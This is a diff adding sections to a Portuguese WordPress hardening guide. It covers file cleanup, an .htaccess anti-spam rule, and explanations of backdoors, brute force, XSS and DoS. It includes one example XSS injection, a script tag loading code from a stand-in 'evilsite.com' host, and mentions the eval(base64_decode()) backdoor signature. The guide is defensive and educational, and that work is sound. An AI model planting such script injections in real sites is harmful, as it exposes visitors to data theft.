@@ -345,3 +345,72 @@ define( 'WP_DEBUG_LOG', true )
 define( 'WP_DEBUG_DISPLAY', false )
 @ini_set( 'display_errors', 'Off' )
 ```
+**13. Exclua arquivos desnecessários do core**
+	
+Exclua sem dó:
+>**/wp-config-sample.php
+/readme.html
+/license.txt
+/wp-admin/install.php**
+
+**14. Diminua a tentativa de SPAM com diretivas específicas no .htaccess**
+```bash
+ # Avoid SPAM and CSRF
+<IfModule mod_rewrite.c>
+ RewriteEngine On
+ RewriteCond %{REQUEST_METHOD} POST
+ RewriteCond %{REQUEST_URI} .(wp-comments-post|wp-login)\.php*
+ RewriteCond %{HTTP_REFERER} !.*exemplo-dominio.* [OR]
+ RewriteCond %{HTTP_USER_AGENT} ^$
+ RewriteRule (.*) http://%{REMOTE_ADDR}/$ [R=301,L]
+</ifModule>
+```
+
+**15. Faça backups sempre!** 
+
+## Principais formas de vulnerabilidade ##
+
+### Backdoors
+Ocorre decorrente a exploração de brechas devido a códigos permissivos ou ainda, plugins, templates ou o core do Wordpress desatualizado. Geralmente a invasão explora a execução não autorizada de arquivos PHP ou o acesso indevido a administração do site (login de fácil descoberta).
+
+Quase sempre criptografados para se parecerem como arquivos legítimos do wordpress, podem ser descobertos por rotinas de [escaneamento](http://cantonbecker.com/etcetera/2009/how-to-search-for-backdoors-in-a-hacked-wordpress-site/) a procura de comandos php específicos como eval(base64_decode()) por exemplo.
+
+As formas de proteção geralmente incluem a autenticação de dois fatores , bloqueio de ip por excesso de tentativa a login, e tratamento das pastas contra execução de código onde não deve , como a pasta Upload por exemplo.
+### Hacks
+São uma forma de Backdoor que trabalha de forma oculta, o objetivo é o uso do ambiente para disseminação de anúncios (span) dos mais variados tipos  (medicamentos, pornô, Jogos de azar, etc) de forma que quanto mais tempo ficar invisível com relação a operação do site melhor, entretanto como ele atua diretamente para os mecanismos de buscas (Googlebots) os próprios mecanismos se encarregam no banimento e desclassificação do site hospedeiro por disseminação de span.
+
+As principais formas de acesso ao servidor são plugins desatualizados ou baixados em sites piratas. Além dos outros já citados acima.
+
+### Força Bruta
+Através de scripts em linha de comando, esse tipo de exploração visa exatamente a exploração dos arquivos de login do wordpress (wp-login.php) afim de realizar tentativas ininterruptas de login, visando a obtenção de logins óbvios ou senhas fracas.
+
+Novamente a autenticação em duas etapas e a limitação de tentativas de login, além de monitoramento e bloqueio automatizado de ip são formas de bloquear esse tipo de backdoor.
+
+### Redirecionamentos Maliciosos
+Exploram as falhas de configuração e proteção de arquivos e pastas importantes (Pastas Upload, Plugins, Templates ou arquivos functions.php, wp-config.php ou .htaccess) do Wordpress para realização de redirecionamentos a outros sites ou até mesmo a injeção de scripts maliciosos na máquina do visitante, as principais forma são:
+
+### Cross-site Scripting (XSS)
+O invasor usa o código malicioso para gerar redirecionamento para outros sites , obtenção de dados de cookie ou de sessão. Podem até fazer um mascaramento do site original iludindo o visitante, fazendo o mesmo achar que está em um site seguro podendo assim inserir senhas de login ou outras informações sensíveis (Pessoais, bancárias, etc) 
+
+Exemplo de código malicioso injetado no site: 
+```html
+<script src = "http://evilsite.com/badscript.js"> </script>
+```
+Formulários sem proteção para validação e higienização dos dados inseridos são as formas mais comuns de acesso ao banco e ao ambiente do site para esse tipo de redirecionamento. O Wordpress possui vários [métodos para Validação, Sanitização e proteção de formulários](https://i1.wp.com/secure.wphackedhelp.com/blog/wp-content/uploads/2018/03/XSS-Attack-in-WordPress-_Developers-Guide-to-prevent.png?w=761&ssl=1) contra a injeção de funções. 
+ 
+Bloquear sempre que possível a inserção de comentários no site, se for o caso, utilizar plugins específicos para comentários.
+
+![Esquema de ataque do tipo XSS (fonte: https://secure.wphackedhelp.com/blog/wordpress-xss-attack/)
+](https://github.com/magororj/WordpressInstallTips/blob/master/image1.png)
+
+### Denial of service (DoS attack)
+Talvez  o tipo de ataque mais perigoso de todos, capaz de colapsar um ou vários servidores em conjunto. Seja por motivação financeira ou ideológica, esse tipo de invasão sobrecarrega a memória dos servidores alvos ou ainda, promove o orquestramento de acessos ininterruptos a um site alvo na tentativa de derrubá-lo. 
+
+### Referências Pesquisadas
+1. https://kinsta.com/pt/blog/seguranca-wordpres/ (acessado em 23/03/20)
+2. https://secure.wphackedhelp.com/blog/eval-base64-decode-hack-wordpress/ (acessado em 25/03/20)
+3. https://secure.wphackedhelp.com/blog/wordpress-xss-attack/ (acessado em 24/03/20)
+4. http://cantonbecker.com/etcetera/2009/how-to-search-for-backdoors-in-a-hacked-wordpress-site/ (acessado em 23/03/20)
+5. https://blog.apiki.com/13-passos-seguranca-do-wordpress/ (acessado em 23/03/20)
+6. https://dipakgajjar.com/fix-403-forbidden-error-in-wordpress-modsecurity/ (acessado em 25/03/20)
+7. https://www.digitalocean.com/community/tutorials/como-instalar-o-wordpress-com-lamp-no-ubuntu-16-04-pt (acessado em 23/03/20)
